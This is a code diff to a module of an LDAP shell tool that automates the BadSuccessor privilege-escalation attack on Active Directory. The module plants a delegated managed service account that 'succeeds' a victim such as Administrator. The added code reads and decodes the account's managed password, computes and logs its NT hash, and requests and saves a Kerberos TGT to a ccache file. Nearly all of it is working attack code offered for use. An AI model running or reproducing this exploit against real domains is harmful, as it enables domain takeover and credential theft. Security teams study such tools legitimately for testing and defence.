@@ -1,8 +1,10 @@
 import logging
 import random
 import string
-from typing import Optional
+from typing import Optional, Tuple
 
+from Cryptodome.Hash import MD4
+from impacket.structure import Structure
 from ldap3 import MODIFY_REPLACE, Connection
 from ldapdomaindump import domainDumper
 from pydantic import BaseModel
@@ -12,6 +14,41 @@ from ldap_shell.utils.ldap_utils import LdapUtils
 
 MSA_STATE_COMPLETED = 2
 DMSA_FILTER = '(objectClass=msDS-DelegatedManagedServiceAccount)'
+
+
+class MSDS_MANAGEDPASSWORD_BLOB(Structure):
+    structure = (
+        ('Version', '<H'),
+        ('Reserved', '<H'),
+        ('Length', '<L'),
+        ('CurrentPasswordOffset', '<H'),
+        ('PreviousPasswordOffset', '<H'),
+        ('QueryPasswordIntervalOffset', '<H'),
+        ('UnchangedPasswordIntervalOffset', '<H'),
+        ('CurrentPassword', ':'),
+    )
+
+    def fromString(self, data):
+        Structure.fromString(self, data)
+        if self['PreviousPasswordOffset'] == 0:
+            end = self['QueryPasswordIntervalOffset']
+        else:
+            end = self['PreviousPasswordOffset']
+        self['CurrentPassword'] = self.rawData[self['CurrentPasswordOffset']:end]
+
+
+def parse_managed_password(blob: bytes) -> Tuple[str, str]:
+    """Return (unicode password, NT hash hex) from an msDS-ManagedPassword blob."""
+    parsed = MSDS_MANAGEDPASSWORD_BLOB(blob)
+    raw = parsed['CurrentPassword'] or b''
+    if raw.endswith(b'\x00\x00'):
+        raw = raw[:-2]
+    nthash = MD4.new(raw).hexdigest()
+    try:
+        password = raw.decode('utf-16-le')
+    except UnicodeDecodeError:
+        password = ''
+    return password, nthash
 
 
 class LdapShellModule(BaseLdapModule):
@@ -24,8 +61,10 @@ class LdapShellModule(BaseLdapModule):
     `set_badsuccessor add Administrator "OU=work,DC=domain,DC=local" evil`
     `set_badsuccessor set Administrator evil$`
     Inline: `ldap_shell domain.local/user:pass set_badsuccessor add Administrator`
-    Needs a Windows Server 2025 schema. Create-dMSA rights on an OU, or write
-    on an existing dMSA, are enough — no rights on the victim.
+    After add/set the module tries to read msDS-ManagedPassword and request a
+    TGT (`<name>.ccache`). Needs a Windows Server 2025 schema. Create-dMSA
+    rights on an OU, or write on an existing dMSA, are enough — no rights on
+    the victim.
     """
     module_type = "Abuse ACL"
 
@@ -103,8 +142,63 @@ class LdapShellModule(BaseLdapModule):
             self.log.error(f'Failed to set BadSuccessor attributes: {self.client.result}')
             return False
         self.log.info(f'{dmsa_dn} now precedes {victim_dn} (msDS-DelegatedMSAState=2)')
-        self.log.info('Authenticate as the dMSA to receive the victim PAC')
+        sam = None
+        if self.client.search(dmsa_dn, '(objectClass=*)', attributes=['sAMAccountName']) and self.client.entries:
+            sam = self.client.entries[0]['sAMAccountName'].value
+        self._try_tgt(dmsa_dn, sam or dmsa_dn)
         return True
+
+    def _try_tgt(self, dmsa_dn: str, sam: str) -> None:
+        """Read the dMSA managed password and request a TGT if possible."""
+        if not self.client.search(dmsa_dn, '(objectClass=*)', attributes=['msDS-ManagedPassword']):
+            self.log.info('Could not read msDS-ManagedPassword; TGT not requested')
+            return
+        raw_values = []
+        if self.client.response:
+            raw_values = self.client.response[0].get('raw_attributes', {}).get('msDS-ManagedPassword') or []
+        if not raw_values and self.client.entries:
+            entry = self.client.entries[0]
+            if 'msDS-ManagedPassword' in entry:
+                raw_values = entry['msDS-ManagedPassword'].raw_values
+        if not raw_values:
+            self.log.info(
+                'msDS-ManagedPassword is empty. TGT not requested — '
+                'authenticate as the dMSA later to receive the victim PAC'
+            )
+            return
+        try:
+            password, nthash = parse_managed_password(raw_values[0])
+        except Exception as exc:
+            self.log.error(f'Failed to parse msDS-ManagedPassword: {exc}')
+            return
+        self.log.info(f'dMSA {sam} NT hash: aad3b435b51404eeaad3b435b51404ee:{nthash}')
+
+        from ldap_shell.krb5 import constants
+        from ldap_shell.krb5.ccache import CCache
+        from ldap_shell.krb5.kerberos_v5 import getKerberosTGT
+        from ldap_shell.krb5.types import Principal
+
+        domain = LdapUtils.get_domain_name(self.domain_dumper.root)
+        kdc = getattr(self.client.server, 'host', None)
+        principal = Principal(sam, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        empty_lm = 'aad3b435b51404eeaad3b435b51404ee'
+        try:
+            tgt, _cipher, old_session_key, session_key = getKerberosTGT(
+                principal, password, domain, empty_lm if not password else '',
+                nthash if not password else '', '', kdc,
+            )
+        except Exception as exc:
+            self.log.error(f'TGT request for {sam} failed: {exc}')
+            return
+        ccache_name = f'{sam.rstrip("$")}.ccache'
+        try:
+            cache = CCache()
+            cache.fromTGT(tgt, old_session_key, session_key)
+            cache.saveFile(ccache_name)
+        except Exception as exc:
+            self.log.error(f'Got TGT but failed to write {ccache_name}: {exc}')
+            return
+        self.log.info(f'Saved TGT to {ccache_name} (KRB5CCNAME={ccache_name})')
 
     def __call__(self):
         action = (self.args.action or '').lower()
@@ -170,4 +264,4 @@ class LdapShellModule(BaseLdapModule):
             self.log.error(f'Failed to create dMSA {dmsa_dn}: {result}')
             return
         self.log.info(f'Created dMSA {sam} at {dmsa_dn} preceding {victim_dn}')
-        self.log.info('Authenticate as the dMSA to receive the victim PAC')
+        self._try_tgt(dmsa_dn, sam)
